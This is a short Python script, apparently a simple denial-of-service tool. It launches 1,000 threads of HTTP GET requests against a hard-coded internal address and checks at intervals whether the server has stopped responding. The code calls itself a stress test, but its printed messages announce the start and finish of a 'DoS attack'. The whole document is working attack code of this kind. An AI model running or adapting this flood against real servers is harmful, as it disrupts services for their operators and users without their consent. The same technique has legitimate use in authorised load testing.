import requests
import threading
import time
from datetime import datetime

failure_count = 0
success_count = 0
lock = threading.Lock()

def send_request(url):
    global failure_count, success_count
    try:
        start_time = time.time()
        response = requests.get(url, timeout=5)
        response_time = time.time() - start_time

        if response.status_code == 200:
            with lock:
                success_count += 1
        else:
            with lock:
                failure_count += 1
    except requests.exceptions.RequestException as e:
        with lock:
            failure_count += 1

def health_check(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return True
        else:
            print(f"[Health Check] Unexpected status: {response.status_code}. Current time: {datetime.now()}")
            return False
    except requests.exceptions.RequestException:
        print(f"[Health Check] Server is unresponsive. Current time: {datetime.now()}")
        return False

def stress_test(url, thread_count):
    print(f"Starting DoS attack at {datetime.now()}")
    global failure_count, success_count
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_request, args=(url,))
        threads.append(thread)
        thread.start()

        if len(threads) % 100 == 0:
            health_check(url)

    for thread in threads:
        thread.join()

    print(f"Test complete. Success: {success_count}, Failures: {failure_count}")
    print(f"Finished DoS attack at {datetime.now()}")

if __name__ == "__main__":
    target_url = "http://10.100.0.1"
    threads = 1000
    stress_test(target_url, threads)
